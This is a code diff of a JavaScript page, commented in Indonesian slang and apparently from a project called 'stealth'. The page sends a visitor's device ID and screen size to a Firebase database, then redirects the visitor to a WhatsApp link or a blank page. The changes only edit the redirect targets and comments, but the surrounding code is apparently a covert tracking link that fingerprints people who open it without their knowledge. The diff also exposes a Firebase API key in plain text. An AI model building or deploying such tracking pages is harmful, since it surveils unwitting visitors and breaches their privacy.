@@ -1,4 +1,4 @@
-// Firebase Config (dari lo)
+// Firebase Config (pake punya lo)
 const firebaseConfig = {
     apiKey: "AIzaSyAKk8yOBe0AJbu9krI0DigvIJpATFWXezE",
     authDomain: "stealth-c7df6.firebaseapp.com",
@@ -68,10 +68,10 @@ push(ref(db, 'devices'), {
     screen: screen.width + 'x' + screen.height
 }).then(() => {
     console.log('✅ Device ID terkirim:', deviceID);
-    // Redirect setelah sukses (GANTI URL TUJUAN LO)
-    window.location.href = 'https://www.example.com';
+    // 🔥 GANTI URL INI PAKE TUJUAN LO!
+    window.location.href = 'https://wa.me/6281234567890'; // Contoh WhatsApp
 }).catch((err) => {
-    console.error('❌ Gagal kirim ke Firebase:', err);
+    console.error('❌ Gagal kirim ke Firebase:', err); // 🔥 Sekarang keliatan error-nya
     // Tetep redirect walau error
-    window.location.href = 'https://www.example.com';
+    window.location.href = 'about:blank';
 });
